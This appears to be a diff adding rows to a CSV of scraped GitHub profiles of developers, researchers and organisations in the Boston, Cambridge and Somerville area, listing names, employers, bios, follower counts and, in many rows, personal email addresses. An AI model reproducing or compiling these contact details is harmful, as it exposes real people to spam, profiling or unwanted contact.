+hjsuh94,Hyung Ju Suh (Terry),Massachusetts Institute of Technology,,"Cambridge, Massachusetts, USA",Cambridge,MA,hjsuh94@gmail.com,"Robotics PhD Student at MIT CSAIL, Robot Locomotion Group",30,63,https://github.com/hjsuh94,filled
+domienschepers,Domien Schepers,,,"Boston, Massachusetts",Boston,MA,,,10,62,https://github.com/domienschepers,filled
+andrewgiessel,andrew giessel,building building,,"Somerville, MA",Somerville,MA,andrew.giessel@gmail.com,technologist and biologist,23,61,https://github.com/andrewgiessel,filled
+photon-efficient-imaging,MIT single-photon imaging team,MIT,,"Cambridge, Massachusetts",Cambridge,MA,,We develop techniques of seeing in the dark -- by making use of every photon.  ,11,60,https://github.com/photon-efficient-imaging,filled
+chrisknepper,Chris Knepper,SapientNitro,,"Boston, Massachusetts",Boston,MA,,,25,60,https://github.com/chrisknepper,filled
+marcneuwirth,Marc Neuwirth,HubSpot,,"Somerville, MA",Somerville,MA,,,42,60,https://github.com/marcneuwirth,filled
+hojae-io,Ho Jae Lee,,"Mechanical Engineering (Robotics) /
+Ph","Cambridge, Massachusetts, USA",Cambridge,MA,,"Mechanical Engineering (Robotics) /
+Ph.D. student at MIT",18,59,https://github.com/hojae-io,filled
+syzhang092218-source,Songyuan Zhang,Massachusetts Institute of Technology,,"Cambridge, Massachusetts, USA",Cambridge,MA,szhang21@mit.edu,"Ph.D. student at REALM lab, MIT, advised by Prof. Chuchu Fan.",14,59,https://github.com/syzhang092218-source,filled
+rishabnayak,Rishab Nayak,videahealth,2x Founder | MLH Top 50 | GCP Professional Cloud Architect,"Boston, Massachusetts",Boston,MA,rishab@rishabnayak.com,2x Founder | MLH Top 50 | GCP Professional Cloud Architect,84,59,https://github.com/rishabnayak,filled
+threethan,Ethan Medeiros,,Data analyst and software developer,USA - Massachusetts - Near Boston,USA - Massachusetts - Near Boston,,ethanjmedei@gmail.com,Data analyst and software developer.,28,58,https://github.com/threethan,filled
+hwchen,Walther Chen,,,"Somerville, MA, USA ",Somerville,MA,,,191,58,https://github.com/hwchen,filled
+aroldan,Anthony Roldan,HubSpot,Director of Engineering for CMS @ HubSpot,"Somerville, MA",Somerville,MA,,Director of Engineering for CMS @ HubSpot,40,57,https://github.com/aroldan,filled
+rdeepc,Saumya Shovan Roy (Deep),,,"Cambridge, Massachusetts",Cambridge,MA,,,19,56,https://github.com/rdeepc,filled
+lukwam,Lukas Karlsson,altissimo-hq  ,Founder @altissimo-hq,"Somerville, MA",Somerville,MA,,Founder @altissimo-hq. Founder @alienwebshop. Chief Technologist: @DarwinsArk. Organizer @gdgcloudboston. ,35,56,https://github.com/lukwam,filled
+rhansen,Richard Hansen,,,"Boston, Massachusetts, USA",Boston,MA,rhansen@rhansen.org,"Jack of all trades, master of none.",78,54,https://github.com/rhansen,filled
+kkdey,Kushal K Dey,Harvard School of Public Health,"Postdoctoral Researcher,
+Harvard School of Public Health,
+Alkes Price Lab","Boston, Massachusetts",Boston,MA,kshldey@gmail.com,"Postdoctoral Researcher,
+Harvard School of Public Health,
+Alkes Price Lab",106,54,https://github.com/kkdey,filled
+warmlogic,Matt Mollison,BranchIntl ,Data scientist/ML engineer; entrepreneur; PhD in cognitive psychology and neuroscience,"Somerville, MA",Somerville,MA,matt.mollison@gmail.com,Data scientist/ML engineer; entrepreneur; PhD in cognitive psychology and neuroscience,56,54,https://github.com/warmlogic,filled
+benjiwheeler,Ben Wheeler,Freelance,"Software engineer, project manager, curriculum designer for Scratch, Twitter, NYC Department of Educ","Somerville, MA",Somerville,MA,wheeler.benjamin@gmail.com,"Software engineer, project manager, curriculum designer for Scratch, Twitter, NYC Department of Education, KIPP NYC, Happyfuncorp.",57,54,https://github.com/benjiwheeler,filled
+wangpengmit,Peng Wang,MIT CSAIL,,"Boston, Massachusetts",Boston,MA,,,23,52,https://github.com/wangpengmit,filled
+ArsenalRecon,Arsenal Recon,,,"Boston, Massachusetts, USA",Boston,MA,,,7,52,https://github.com/ArsenalRecon,filled
+adamribaudo,Adam Ribaudo,,,"Somerville, MA",Somerville,MA,,,32,52,https://github.com/adamribaudo,filled
+KrishnaRSampath,Krishna R. Sampath,,Independent developer,"Somerville, MA",Somerville,MA,Krishna.R.Sampath@gmail.com,"Independent developer.
+
+Former Venture Development Director for @Independent-Software and Instructor with @generalassembly-bos",39,52,https://github.com/KrishnaRSampath,filled
+vedant130701,Vedant Rishi Das,,,"Boston, Massachusetts, USA",Boston,MA,,An enthusiast in various fields of computer science. Learning Machine Learning and Application Development as a hobby and to attain the skillset.,32,51,https://github.com/vedant130701,filled
+freerobby,Robby Grossman,Wistia,,"Somerville, MA",Somerville,MA,robby@freerobby.com,,128,51,https://github.com/freerobby,filled
+shreyasgm,Shreyas Gadgin Matha,cid-harvard ,Senior Computational Social Scientist at Harvard Kennedy School,"Cambridge, Massachusetts, USA",Cambridge,MA,,Senior Computational Social Scientist at Harvard Kennedy School,27,50,https://github.com/shreyasgm,filled
+SynapticSage,Ryan Young,Brandeis University,"Senior Machine Learning Engineer
+
+💻 Ph","Boston, Massachusetts",Boston,MA,github@ryanyoung.io,"Senior Machine Learning Engineer
+
+💻 Ph.D., Computational/Sys Neuro  || 
+
+ANNs 🦾, Statistics, and Applied Math ∂, and Data Science",53,50,https://github.com/SynapticSage,filled
+devMoisa,Mr Moises,,,"Boston, Massachusetts, United States",Boston,MA,,Hello :),21,50,https://github.com/devMoisa,filled
+sarina,Sarina Canelake,Open edX,,"Somerville, MA",Somerville,MA,,,48,50,https://github.com/sarina,filled
+vagarwal87,Vikram Agarwal,Sanofi,,"Somerville, MA",Somerville,MA,,"Head of mRNA Design Data Science, Sanofi. Research genomics, gene regulation, and machine learning/AI.",5,50,https://github.com/vagarwal87,filled
+marksherman,Mark Sherman,Emmanuel College,Professor of Computer Science at Emmanuel College,"Boston, Massachusetts, USA",Boston,MA,shermanm@emmanuel.edu,Professor of Computer Science at Emmanuel College. Previously postdoc researcher at MIT with @mit-cml. Alum of @engaging-computing at UMass Lowell.,86,49,https://github.com/marksherman,filled
+RIVeR-Lab,Robotics and Intelligent Ground Vehicle Research Laboratory ,,,"Boston, Massachusetts",Boston,MA,riverlab@neu.edu,,121,49,https://github.com/RIVeR-Lab,filled
+SusanRatiLane,Susan Rati Lane,MIT,MIT App Inventor Developer,"Somerville, MA",Somerville,MA,,MIT App Inventor Developer,5,49,https://github.com/SusanRatiLane,filled
+feziodoshi,fenildoshi,,,"Cambridge, Massachusetts",Cambridge,MA,,Deep Learning | Computer Vision,90,48,https://github.com/feziodoshi,filled
+weirdindiankid,Dharmesh Tarapore,Boston University,,"Boston, Massachusetts, United States",Boston,MA,,I like building things.,178,48,https://github.com/weirdindiankid,filled
+cohoe,Grant Cohoe,,,Somerville MA USA,Somerville MA USA,,grant@grantcohoe.com,Server farmer turned cloud plumber. Shepherd of lost packets.,45,48,https://github.com/cohoe,filled
+szmyty,Alan Szmyt,,,"Boston, Massachusetts",Boston,MA,,,14,47,https://github.com/szmyty,filled
+InquisitiveAS,Abhishek Shinde,Silman : TY Lin : SIDARA Group,,"Boston, Massachusetts, USA",Boston,MA,,Developing AI workflows for Computation design ++& BIM ,5,46,https://github.com/InquisitiveAS,filled
+mshick97,Maxwell Shick,,Software engineer,"Greater Boston, Massachusetts",Greater Boston,MA,,Software engineer,16,46,https://github.com/mshick97,filled
+LPespisa,Lauren Pespisa,,,"Somerville, MA",Somerville,MA,,,8,46,https://github.com/LPespisa,filled
+wcummings,William Cummings,,,"Somerville, MA",Somerville,MA,,Software gardener and convenience enthusiast,21,46,https://github.com/wcummings,filled
+ashernoel,Asher Noel,Harvard University,,"Cambridge, Massachusetts",Cambridge,MA,ashernoel@college.harvard.edu,"CS at Harvard
+",20,44,https://github.com/ashernoel,filled
+evbacher,evbacher,,"writer, developer","Cambridge, Massachusetts",Cambridge,MA,,"writer, developer",11,44,https://github.com/evbacher,filled
+ZelnickB,Ben Zelnick,Massachusetts Institute of Technology (@mit),,"Cambridge, Massachusetts",Cambridge,MA,,Hobbyist programmer. Computer science enthusiast. MIT undergraduate.,9,44,https://github.com/ZelnickB,filled
+peterkty,Peter Kuan-Ting Yu,XYZ Robotics,,"Boston, Massachusetts",Boston,MA,peterkty@gmail.com,,12,44,https://github.com/peterkty,filled
+ywwg,Owen Williams,Grafana Labs,"@grafana Labs: Principal Software Engineer, Cloud Backend","Somerville, MA",Somerville,MA,owilliams@mixxx.org,"@grafana Labs: Principal Software Engineer, Cloud Backend.  @mixxxdj: core contributor. Member of @prometheus -team and @open-telemetry 
+",60,44,https://github.com/ywwg,filled
+pauld4,Paul Dziedzic,,Software developer in Javascript and PHP,"Boston, Massachusetts, USA",Boston,MA,,Software developer in Javascript and PHP. ,4,43,https://github.com/pauld4,filled
+ECorreia45,Elson Correia,ecorreia designs,,Boston Massachusetts,Boston Massachusetts,,,Building the dream line by line…,18,43,https://github.com/ECorreia45,filled
+sjml,Shane Liesegang,,theater kid turned video game developer turned Jesuit,"Boston, Massachusetts",Boston,MA,,theater kid turned video game developer turned Jesuit,96,43,https://github.com/sjml,filled
+jedpimentel,José Eduardo Pimentel,,,"Boston, Massachusetts",Boston,MA,jedpimentel@gmail.com,,63,43,https://github.com/jedpimentel,filled
+teledatics,Teledatics Inc,Teledatics Inc,,"Boston, Massachusetts",Boston,MA,,Intelligence At The Edge,29,43,https://github.com/teledatics,filled
+tulip,Tulip,,,"Somerville, MA",Somerville,MA,opensource@tulip.co,,88,43,https://github.com/tulip,filled
+mcmillen,Colin McMillen,SemiColin Games,"Lead developer, SemiColin Games","Somerville, MA",Somerville,MA,colin@semicolin.games,"Lead developer, SemiColin Games.
+
+I've removed my code from GitHub. You can find it all at https://git.mcmillen.dev instead.",0,43,https://github.com/mcmillen,filled
+WilHall,Wil Hall,zeus-health ,"Full Stack Web Developer @zeus-health, ceramicist","Somerville, MA",Somerville,MA,wil@wilhall.com,"Full Stack Web Developer @zeus-health, ceramicist. Previously @augusthealth, @sagewell, @thoughtbot.",3,43,https://github.com/WilHall,filled
+panditanvita,Anvita Pandit,,,"Somerville, MA",Somerville,MA,panditanvita@gmail.com,"Based out of Cambridge-Somerville, MA.",10,43,https://github.com/panditanvita,filled
+MayD524,Ryan,,,"Boston, Massachusetts",Boston,MA,,"Your average nerd always coding and working on weird projects, but having the time of their life doin so.",61,42,https://github.com/MayD524,filled
+tmrudick,Tom Rudick,,,"Somerville, MA",Somerville,MA,tmrudick@gmail.com,,55,42,https://github.com/tmrudick,filled
+admac-hub,Ardit Cuko,Babson College,"Polytechnic University of Tirana , graduated in mathematic engineering","Boston , Massachusetts",Boston,MA,,"Polytechnic University of Tirana , graduated in mathematic engineering. 
+Currently working as System Engineer.
+Coding is my entertainment.",19,41,https://github.com/admac-hub,filled
+MattGuerrette,Matt Guerrette,AMD,C/C++ Software Engineer,"Boston, Massachusetts",Boston,MA,direct3Dtutorials@gmail.com,C/C++ Software Engineer,18,41,https://github.com/MattGuerrette,filled
+hakamadare,Steve Huff,,,"Somerville, MA",Somerville,MA,shuff@vecna.org,,196,41,https://github.com/hakamadare,filled
+tomato1mule,Hyunwoo Ryu,MIT CSAIL,,"Cambridge, Massachusetts",Cambridge,MA,hwryu@csail.mit.edu,Incoming EECS Ph.D. Student at MIT CSAIL,38,40,https://github.com/tomato1mule,filled
+SirTangent,Wyatt Phillips,Philips North America,"Software Engineer of all trades, master of","Cambridge, Massachusetts",Cambridge,MA,wphillips@128.dev,"Software Engineer of all trades, master of... well I'm not sure. 😜",21,40,https://github.com/SirTangent,filled
+roopikarisam,Roopika Risam,Dartmouth College,Associate Professor in the Digital Humanities and Social Engagement cluster at Dartmouth,"Greater Boston, Massachusetts",Greater Boston,MA,roopika.risam@dartmouth.edu,Associate Professor in the Digital Humanities and Social Engagement cluster at Dartmouth,30,40,https://github.com/roopikarisam,filled
+porter-wang,Bote (Porter) Wang,,"You know, I am something of a software engineer myself :)","Boston, Massachusetts",Boston,MA,bote.wang@outlook.com,"You know, I am something of a software engineer myself :)",6,40,https://github.com/porter-wang,filled
+ryanttb,Ryan Morrison~Westphal,Tripping the Bits,,"Somerville, MA",Somerville,MA,mr.tyzik@gmail.com,,82,40,https://github.com/ryanttb,filled
+bellegis,Belle Lipton,,,"Somerville, MA",Somerville,MA,belle_lipton@harvard.edu,GIS Librarian @ Harvard Map Collection,20,40,https://github.com/bellegis,filled
+DMH42,Daniel Munoz,www.munoz.fyi,,"Cambridge, Massachusetts",Cambridge,MA,,,11,39,https://github.com/DMH42,filled
+CaineArdayfio,Caine,,,"Boston, Massachusetts",Boston,MA,ardayfiocaine@gmail.com,Hi! You can find the most up-to-date information about me on my website: www.ardayf.io,10,39,https://github.com/CaineArdayfio,filled
+johnbachman,John A. Bachman,,,"Boston, Massachusetts",Boston,MA,bachmanjohn@gmail.com,"Systems, synthetic, and computational biology.",75,39,https://github.com/johnbachman,filled
+BriannaD23,BreezytheCoder,,Hi there! I'm a front-end developer with a passion for creating beautiful and engaging user experien,"Boston, Massachusetts",Boston,MA,,Hi there! I'm a front-end developer with a passion for creating beautiful and engaging user experiences.  Looking to expand my network!  ,40,39,https://github.com/BriannaD23,filled
+eleanordare,Eleanor Mehlenbacher,Path-AI ,Software Engineer at PathAI,"Boston, Massachusetts",Boston,MA,eleanordarem@gmail.com,Software Engineer at PathAI,28,39,https://github.com/eleanordare,filled
+dmahr1,Dan Mahr,dronedeploy,Geospatial software engineer,"Somerville, MA",Somerville,MA,,Geospatial software engineer,11,39,https://github.com/dmahr1,filled
+wpeterson,Winfield Peterson,babylist ,"Software engineer, Dad, cyclist, music nerd, auto enthusiast, avid reader - Engineering @ Babylist","Somerville, MA",Somerville,MA,winfield.peterson@gmail.com,"Software engineer, Dad, cyclist, music nerd, auto enthusiast, avid reader - Engineering @ Babylist",21,39,https://github.com/wpeterson,filled
+gnodar01,Nodar Gogoberidze,Broad Institute - Imaging Platform,,"Cambridge, Massachusetts",Cambridge,MA,,,43,38,https://github.com/gnodar01,filled
+PranavSitaraman,Pranav Sitaraman,Harvard University,"Hi! I'm a student, researcher, and engineer passionate about ML and robotics","Cambridge, Massachusetts",Cambridge,MA,sitaraman.pranav@gmail.com,"Hi! I'm a student, researcher, and engineer passionate about ML and robotics.",61,38,https://github.com/PranavSitaraman,filled
+aron1127,Enkha,Enkha Studio,,Massachusetts Boston,Massachusetts Boston,,aron1127@naver.com,"YOLO_Life
+",1,38,https://github.com/aron1127,filled
+deviant-logic,Alec,,,"Somerville, MA",Somerville,MA,,,25,38,https://github.com/deviant-logic,filled
+heyaudace,Audace Nakeshimana,"Apple, Insightiv",Senior in Computer Science and Engineering at MIT,"Cambridge, Massachusetts from Kigali, Rwanda",Cambridge,MA,audace@insightiv.ai,"Senior in Computer Science and Engineering at MIT. 
+
+Interests:
+- Performance Engineering | IoT | ML",13,37,https://github.com/heyaudace,filled
+isundaylee,Jiahao Li,Massachusetts Institute of Technology,,"Cambridge, Massachusetts",Cambridge,MA,jiahaoli@mit.edu,,240,37,https://github.com/isundaylee,filled
+ArvindParekh,Arvind Parekh,,"Full-Stack Developer | Open-Source Contributor |
+Loves 💻 | 🎸 | 🏃🏻‍♂️ 
+
+Make cool things","Boston, Massachusetts",Boston,MA,aruparekh@gmail.com,"Full-Stack Developer | Open-Source Contributor |
+Loves 💻 | 🎸 | 🏃🏻‍♂️ 
+
+Make cool things. Be nice.",69,37,https://github.com/ArvindParekh,filled
+yshavit,Yuval Shavit,,,"Somerville, MA",Somerville,MA,dev@yuvalshavit.com,,28,37,https://github.com/yshavit,filled
+cspanring,Christian Spanring,coUrbanize,,"Somerville, MA",Somerville,MA,cspanring@gmail.com,Urban planning tool builder,77,37,https://github.com/cspanring,filled
+gohar94,Gohar Irfan Chaudhry,mit,,"Cambridge, Massachusetts",Cambridge,MA,girfan@mit.edu,PhD student @ MIT CSAIL,94,36,https://github.com/gohar94,filled
+michaellu2019,Michael Lu,,,"Cambridge, Massachusetts",Cambridge,MA,,exceptionally mediocre,37,36,https://github.com/michaellu2019,filled
+norbauer,Norbauer Inc,Norbauer Inc,,"Boston, Massachusetts, USA",Boston,MA,consulting@norbauer.com,,11,36,https://github.com/norbauer,filled
+evergage,Evergage,,,"Somerville, MA, USA",Somerville,MA,,,40,36,https://github.com/evergage,filled
+cdanis,Chris Danis,,Somervillian ✨ meme reliability engineer  ✨ they/them,"Somerville, MA",Somerville,MA,cdanis@gmail.com,Somervillian ✨ meme reliability engineer  ✨ they/them,97,36,https://github.com/cdanis,filled
+zachpestaina,Zach Pestaina,,,"Boston, Massachusetts",Boston,MA,,,8,35,https://github.com/zachpestaina,filled
+AbelChiquetti,Abel Chiquetti,MoneySystem,💻 Fullstack Dev | 🚀 Flutter • React • Node | 🎯 Founder UltraAgency & CEO MoneySystem | Custom Sites ,Boston - Massachusetts,Boston - Massachusetts,,,💻 Fullstack Dev | 🚀 Flutter • React • Node | 🎯 Founder UltraAgency & CEO MoneySystem | Custom Sites & Branding for Businesses in the U.S.,12,35,https://github.com/AbelChiquetti,filled
+dougo,Doug Orleans,,Full stack web developer,"Somerville, MA, USA",Somerville,MA,door@hey.com,Full stack web developer.,30,35,https://github.com/dougo,filled
+aresnick,Alec Resnick,"thesprouts, @powderhouse",,"Somerville, MA",Somerville,MA,aresnickety@gmail.com,working to start a different kind of university,24,35,https://github.com/aresnick,filled
+jovinbm,Jovin Mwilanga,Twitter,,"Cambridge, Massachusetts, USA ",Cambridge,MA,,,61,34,https://github.com/jovinbm,filled
+ummaraali2,Ummara Ali Syeda,,,"Boston, Massachusetts, USA",Boston,MA,,,27,34,https://github.com/ummaraali2,filled
+BrainCoTech,BrainCo Inc.,,,Somerville MA,Somerville MA,,se@brainco.tech,,48,34,https://github.com/BrainCoTech,filled
+Richard-Matthew-Stallman,Richard Matthew Stallman,Free Software Foundation,"Creator of the GNU Project, founder of the Free Software Foundation","Cambridge, Massachusetts",Cambridge,MA,,"Creator of the GNU Project, founder of the Free Software Foundation.",0,33,https://github.com/Richard-Matthew-Stallman,filled
+mewtaylor,Matthew Taylor,Data-Nutrition-Project,,"Cambridge, Massachusetts",Cambridge,MA,,,23,33,https://github.com/mewtaylor,filled
+dominic-chang,Dominic Chang,Center for Astrophysics,,"Cambridge, Massachusetts",Cambridge,MA,dochang@g.harvard.edu,"Physicist from Kingston, Jamaica who studies black holes.",51,33,https://github.com/dominic-chang,filled
+auriium2,Matt Lui,Massachusetts Institute of Technology,,"Cambridge, Massachusetts",Cambridge,MA,,wow! what a world.,62,33,https://github.com/auriium2,filled
+houhoulis,Chris Houhoulis,,,"Boston, Massachusetts, U.S.",Boston,MA,,,80,33,https://github.com/houhoulis,filled
+rockpapergoat,nate,,,"somerville, ma",somerville,MA,,,49,33,https://github.com/rockpapergoat,filled
+jeremyzyang,Jeremy Yang,Harvard University,"assistant professor at harvard |     
+ai and economics","Cambridge, Massachusetts",Cambridge,MA,jeremy.z.yang@gmail.com,"assistant professor at harvard |     
+ai and economics ",35,32,https://github.com/jeremyzyang,filled
+LukeJYK,Yankai Jiang,Northeastern University,,"Boston, Massachusetts",Boston,MA,jiang.yank@northeastern.edu,PhD@Northeastern,23,32,https://github.com/LukeJYK,filled
+BSathvik,Sathvik Birudavolu,,,"Cambridge, Massachusetts",Cambridge,MA,,Infrastructure @kensho-technologies,42,31,https://github.com/BSathvik,filled
+caiolandgraf,Caio Landgraf,EiCode,"Hello! Welcome to my profile! I am Full Stack Developer very well trained and qualified, soon I will","Massachusetts , Boston",Massachusetts,BO,eu.caiolandgraf@gmail.com,"Hello! Welcome to my profile! I am Full Stack Developer very well trained and qualified, soon I will post more content!",54,31,https://github.com/caiolandgraf,filled
+justinkay,Justin Kay,MIT,Co-founder Ai,"Somerville, MA",Somerville,MA,kayj@mit.edu,"PhD student at MIT. Co-founder Ai.Fish.
+Research on computer vision, machine learning, ecology, climate.",23,31,https://github.com/justinkay,filled
+ntenczar,Nate Tenczar,appcues ,,"Somerville, MA",Somerville,MA,ntenczar@gmail.com,,17,31,https://github.com/ntenczar,filled
+Pehlevan-Group,Pehlevan-Group,,,"Cambridge, Massachusetts, USA",Cambridge,MA,,,32,30,https://github.com/Pehlevan-Group,filled
+blayyyyyk,Blake Moody,,,"Boston, Massachusetts",Boston,MA,,blake@mpsych.org,43,30,https://github.com/blayyyyyk,filled
+gfarb,Max Goldfarb,GitHub,Software Engineer III @ GitHub (Copilot),"Boston, Massachusetts USA",Boston,MA,max@goldfarb.dev,Software Engineer III @ GitHub (Copilot),17,30,https://github.com/gfarb,filled
+trisk,Albert Lee,racktopsystems,,"Boston, Massachusetts",Boston,MA,trisk@forkgnu.org,,88,30,https://github.com/trisk,filled
+jakecorrenti,Jake Correnti,Red Hat,"Software Engineer @ Red Hat 
+working on Virtualization","Greater Boston, Massachusetts",Greater Boston,MA,,"Software Engineer @ Red Hat 
+working on Virtualization",55,30,https://github.com/jakecorrenti,filled
+kagaminccino,Shang-Yi Chuang,Apple Inc.,ML Researcher | Siri ASR R&D @ Apple,"Boston, Massachusetts, United States",Boston,MA,,ML Researcher | Siri ASR R&D @ Apple,9,30,https://github.com/kagaminccino,filled
+subalterngames,Esther Alter,Subaltern Games,,"Somerville, MA",Somerville,MA,subalterngames@gmail.com,,32,30,https://github.com/subalterngames,filled
+e0d,Edward Zarecor,,,"Somerville, MA",Somerville,MA,,,63,30,https://github.com/e0d,filled
+Velir,Velir,,,"Somerville, MA",Somerville,MA,itsupport@velir.com,,22,30,https://github.com/Velir,filled
+morganpackard,Morgan Packard,morganpackard.com,,"Somerville, MA, USA",Somerville,MA,morgan@morganpackard.com,,34,30,https://github.com/morganpackard,filled
+jaytlang,Jay Lang,MIT,,"Massachusetts Institute of Technology, Cambridge, MA",Massachusetts Institute of Technology,CA,,"Kernel hacker, CS contrarian, and pasta enthusiast.
+MIT Class of '22",33,29,https://github.com/jaytlang,filled
+JoyceBettencourt,Joyce Bettencourt,AvaCon ,Founder @AvaCon & @VesuviusGroup,"Boston, Massachusetts",Boston,MA,studioh2o@gmail.com,"Designer focused on convergence of community, social good & the future. Founder @AvaCon & @VesuviusGroup. @SingularityUniversity & @StartupWeekend alumni.",4,29,https://github.com/JoyceBettencourt,filled
+jdtzmn,Jacob Daitzman,Software Engineer Studying AI + Decision Making @MIT '25,,"Boston, Massachusetts, USA",Boston,MA,jdtzmn@gmail.com,,94,29,https://github.com/jdtzmn,filled
+sunmengyue,Simon Sun,,Frontend developer with a calm and focused demeanor,"Boston, Massachusetts",Boston,MA,mengyuesun@gmail.com,Frontend developer with a calm and focused demeanor. Technically proficient and analytical problem solver,119,29,https://github.com/sunmengyue,filled
+firechicago,Chris Wand,Vermonster,,"Somerville, MA",Somerville,MA,chris.wand@gmail.com,,13,29,https://github.com/firechicago,filled
+obinnaokechukwu,Obinna Okechukwu,Google Inc,,"Cambridge, Massachusetts",Cambridge,MA,,,42,28,https://github.com/obinnaokechukwu,filled
+compbiomed,Section of Computational Biomedicine,,,"Boston, Massachusetts",Boston,MA,,Making Translational Bioinformatics Go Faster,18,28,https://github.com/compbiomed,filled
+folksgl,Garrett Folks,EasyDynamics ,"Software Engineer for @EasyDynamics building, designing, and securing the systems that protect our p","Boston, Massachusetts ",Boston,MA,,"Software Engineer for @EasyDynamics building, designing, and securing the systems that protect our people, places, and way of life.",38,28,https://github.com/folksgl,filled
+nibrivia,Olivia Brode-Roger,Brown University,,"Somerville, MA",Somerville,MA,,"Currently doing a PhD at Brown.
+Previously at MIT, @recursecenter (participant), Brilliant.org, and iCivics.",66,28,https://github.com/nibrivia,filled
+mmachenry,Mike MacHenry,,,"Somerville, MA, United States",Somerville,MA,mike.machenry@gmail.com,The only living person accurately described by all adjectives.,64,28,https://github.com/mmachenry,filled
+rhysyngsun,Nathan Levesque,mitodl ,,"Somerville, MA, USA",Somerville,MA,,,56,28,https://github.com/rhysyngsun,filled
+cttdev,Claudius Tewari,MIT,Student at Massachusetts Institute of Technology studying Mechanical Engineering with a concentratio,"Cambridge, Massachusetts",Cambridge,MA,,Student at Massachusetts Institute of Technology studying Mechanical Engineering with a concentration in Robotics.,48,27,https://github.com/cttdev,filled
+yzhang37,X230大青椒 (John Yin / Zhenghang Yin),,,"Boston, Massachusetts; Shanghai, China",Boston,MA,lacus_x230nz666@outlook.com,,64,27,https://github.com/yzhang37,filled
+jamaltoutouh,"Jamal Toutouh, PhD",Massachusetts Institute of Technology ,Professor at University of Malaga (Spain) & Research Associate at CSAIL-MIT #DeepNeuroevolution #GAN,"Boston, Massachusetts",Boston,MA,jamaltoutouh@gmail.com,Professor at University of Malaga (Spain) & Research Associate at CSAIL-MIT #DeepNeuroevolution #GANs #AIforImpact ,44,27,https://github.com/jamaltoutouh,filled
+kingspp,Prathyush SP,CodaMetrix,"Machine Learning Engineer @CodaMetrix,
+Adjunct Lecturer @WPI","Boston, Massachusetts",Boston,MA,,"Sr. Machine Learning Engineer @CodaMetrix,
+Adjunct Lecturer @WPI",78,27,https://github.com/kingspp,filled
+aliasghar211,Ali Asghar Aamir,Purdue University,Design Engineer @KAYAK,"Boston, Massachusetts",Boston,MA,,Design Engineer @KAYAK,4,27,https://github.com/aliasghar211,filled
+JFWebb,Julie Webb,,A software engineer hailing from the Greater Boston Area,"Boston, Massachusetts ",Boston,MA,julief.webb@gmail.com,"A software engineer hailing from the Greater Boston Area. As a left-brained & right-brained person, I’m drawn to both the analytical and the visual.",15,27,https://github.com/JFWebb,filled
+jamesql,James,Arvo Development,Software Engineer,"Boston, Massachusetts",Boston,MA,,Software Engineer.,63,27,https://github.com/jamesql,filled
+irakrakow,Ira Krakow,Ira Krakow,,"Boston, Massachusetts",Boston,MA,ira.krakow@gmail.com,,6,27,https://github.com/irakrakow,filled
+harveyxia,Harvey Xia,Reddit,,"Somerville, MA",Somerville,MA,harvey@harveyxia.com,,31,27,https://github.com/harveyxia,filled
+ExPixel,Marc C.,none,,"Boston, Massachusetts",Boston,MA,,I make stuff every now and then.,77,26,https://github.com/ExPixel,filled
+HughxDev,Hugh Guiney,hughx,,"Boston, Massachusetts, USA",Boston,MA,,$121.08 ain’t a bad teddy bear fee. (fka @hguiney),59,26,https://github.com/HughxDev,filled
+gwr,Gordon Ross,"RackTop Systems, Inc.",,"Boston area, Massachusetts, USA",Boston area,MA,Gordon.W.Ross@gmail.com,,24,26,https://github.com/gwr,filled
+AliciaGlenn,Alicia Glenn,Open for Work,,"Boston, Massachusetts ",Boston,MA,Alicia@AliciaGlenn.com,"From sales pitches to code snippets, I'm the bridge between the two! ",25,26,https://github.com/AliciaGlenn,filled
+ktsitsi,Konstantinos Tsitsimpikos,TileDB-Inc ,Staff Software Engineer @TileDB-Inc,"Boston, Massachusetts",Boston,MA,,Staff Software Engineer @TileDB-Inc ,12,26,https://github.com/ktsitsi,filled
+ericdrobinson,Eric Robinson,"Sonic Bloom, LLC",Cofounder and Lead Developer at Sonic Bloom,"Cambridge, Massachusetts, USA",Cambridge,MA,,Cofounder and Lead Developer at Sonic Bloom. Areas of focus include game development and audio.,11,25,https://github.com/ericdrobinson,filled
+davidkastner,David W. Kastner,Massachusetts Institute of Technology,MIT PhD Candidate • Bioengineering,MIT Cambridge Massachusetts,MIT Cambridge Massachusetts,,kastner@mit.edu,MIT PhD Candidate • Bioengineering,12,25,https://github.com/davidkastner,filled
+zcysxy,Chenyu Zhang,MIT,,"Cambridge, Massachusetts",Cambridge,MA,zcysxy@mit.edu,,56,25,https://github.com/zcysxy,filled
+psiorx,John Carter,MIT CSAIL,,"Cambridge, Massachusetts",Cambridge,MA,,,34,25,https://github.com/psiorx,filled
+VamshiVerma,Vamshi Verma,,,"Boston,Massachusetts",Boston,MA,vamshipaili@outlook.com,"APIs, Web3, and Blockchain.
+3X Hackathon 🥇 #HackHarvard #HackBoston #HackaTRON",36,25,https://github.com/VamshiVerma,filled
+ThomasJClark,Tom Clark,CarGurus,,"Boston, Massachusetts",Boston,MA,tom@tclark.io,,48,25,https://github.com/ThomasJClark,filled
+HeyIts-RJ,Rishabh Jain,,Full Stack Developer | Android | Cloud | GenAI Ops,"Boston, Massachusetts",Boston,MA,mail@heyitsrj.com,Full Stack Developer | Android | Cloud | GenAI Ops,19,25,https://github.com/HeyIts-RJ,filled
+tudaga,Aleksandrina Goeva,Broad Institute,,"Cambridge, Massachusetts",Cambridge,MA,alexandrina.goeva@gmail.com,,18,24,https://github.com/tudaga,filled
+dan-builds-robots,dan ajayi,Massachusetts Institute of Technology,,"Cambridge, Massachusetts",Cambridge,MA,,hi its dan and I love building ✌🏽,37,23,https://github.com/dan-builds-robots,filled
+mmarkakis,Markos Markakis,Massachusetts Institute of Technology,,"Cambridge, Massachusetts",Cambridge,MA,markakis@mit.edu,,15,23,https://github.com/mmarkakis,filled
+nature21,Yuyao Liu,MIT,,"Cambridge, Massachusetts",Cambridge,MA,,Incoming PhD student at MIT,15,22,https://github.com/nature21,filled
+snehabhattacharya,Sneha Bhattacharya,,,"Cambridge, Massachusetts. ",Cambridge,MA,,,29,21,https://github.com/snehabhattacharya,filled
+biobotanalytics,Biobot Analytics,,,"Cambridge, Massachusetts",Cambridge,MA,hello@biobot.io,We transform city sewers into public health observatories.,6,21,https://github.com/biobotanalytics,filled
+BriannHu,Brian Hu,Google,,"Cambridge, Massachusetts",Cambridge,MA,,"Student at McGill University majoring in Computer Science. Passionate about coding, researching & hacking (in hackathons).",25,20,https://github.com/BriannHu,filled
+robruma,Rob Ruma,Harvard University Information Technology,,"Cambridge, Massachusetts",Cambridge,MA,,,28,20,https://github.com/robruma,filled
